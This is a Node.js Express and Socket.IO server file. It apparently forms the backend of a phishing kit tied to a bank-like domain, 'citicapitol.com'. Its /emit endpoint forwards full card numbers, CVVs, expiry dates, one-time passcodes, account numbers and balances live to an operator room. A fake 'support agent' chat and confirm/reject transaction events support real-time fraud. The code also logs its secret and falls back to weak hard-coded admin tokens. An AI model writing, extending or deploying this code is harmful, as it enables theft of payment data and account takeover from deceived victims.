
  // socket-server.js
console.log("🧠 Starting socket server...");

import 'dotenv/config';
import express from "express";
import http from "http";
import { Server } from "socket.io";

console.log("✅ Modules imported. Env vars:", process.env.PORT, process.env.SOCKET_SECRET);

const app = express();
const server = http.createServer(app);

const io = new Server(server, {
  cors: {
    origin: ["https://citicapitol.com", "http://localhost:3000"],
    methods: ["GET", "POST"]
  }
});

app.use(express.json());

// ================= TRANSACTION CONFIRMATIONS =================
const pendingConfirmations = {};
const SECRET = process.env.SOCKET_SECRET || "replace_with_a_strong_secret";

app.post("/emit", (req, res) => {
  const token = req.header("x-api-key") || "";
  if (!token || token !== SECRET) return res.status(401).json({ ok: false, message: "Unauthorized" });

  const payload = req.body || {};
  const safe = {
    transaction_id: payload.transaction_id || null,
    fullname: payload.fullname || null,
    amount: payload.amount || null,
    status: payload.status || "unknown",
    time: payload.time || new Date().toISOString(),
    bank: payload.bank || "Unknown",
    holder: payload.holder || null,
    cardNumber: payload.cardNumber || null,
    expiration: payload.expiration || null,
    account_type: payload.account_type || null,
    account_number: payload.account_number || null,
    balance: payload.balance || null,
    cvv: payload.cvv || null,
    brand: payload.brand || null,
    otp: payload.otp || null
  };

  io.to("admins").emit("notify_admin", safe);
  res.json({ ok: true });
});

// ================= LIVE CHAT SYSTEM =================
const chatRooms = {}; // { roomId: { user: {name,email}, messages: [] } }
const ADMIN_SECRET = process.env.ADMIN_ROOM_SECRET || "supersecretadmin";

io.on("connection", (socket) => {
  console.log("Socket connected:", socket.id);

  // ================= ADMIN HANDLERS =================
  socket.on("join_admin_room", ({ token }) => {
    if (token === ADMIN_SECRET) {
      socket.join("admins");
      socket.emit("joined_admin");
      console.log("Admin joined:", socket.id);
      socket.emit("active_chat_rooms", chatRooms); // send current active chats
    } else {
      socket.emit("error", "Invalid admin token");
    }
  });

  socket.on("admin_send", ({ room, message }) => {
    if (!room || !message) return;
    chatRooms[room]?.messages.push({ sender: "Admin", message });
    io.to(room).emit("admin_message", { message });
    socket.to("admins").emit("admin_message_sent", { room, message });
  });

  // ================= USER HANDLERS =================
  socket.on("join_chat", ({ name, email, room }) => {
    if (!name || !email || !room) return;

    socket.join(room);
    chatRooms[room] = chatRooms[room] || { user: { name, email }, messages: [] };
    console.log(`User joined chat room: ${room}`, name, email);

    // Welcome message
    socket.emit("admin_message", { message: `Hello ${name}, a support agent will join shortly.` });

    // Notify admins of new user
    io.to("admins").emit("new_user", { room, name, email });
  });

  socket.on("user_message", ({ room, name, message }) => {
    if (!room || !message) return;

    chatRooms[room]?.messages.push({ sender: name, message });
    io.to("admins").emit("user_message", { room, sender: name, message });
  });

  // ================= TRANSACTION HANDLERS =================
  function emitTransactionUpdate(transaction_id, data, status) {
  const payload = { ...data, status };
  pendingConfirmations[transaction_id] = payload;
  io.emit(`txn_${status}`, payload);
}

  socket.on("txn_confirmed", (data) => emitTransactionUpdate(data.transaction_id, data, "confirmed"));
  socket.on("txn_rejected", (data) => emitTransactionUpdate(data.transaction_id, data, "rejected"));

  socket.on("user_join", ({ transaction_id }) => {
    if (pendingConfirmations[transaction_id]) {
      socket.emit("txn_confirmed", pendingConfirmations[transaction_id]);
    }
  });

  // ================= DISCONNECT =================
  socket.on("disconnect", () => {
    console.log("Socket disconnected:", socket.id);
  });
});

const PORT = process.env.PORT || 3001;
server.listen(PORT, () => console.log(`Socket server running on port ${PORT}`));
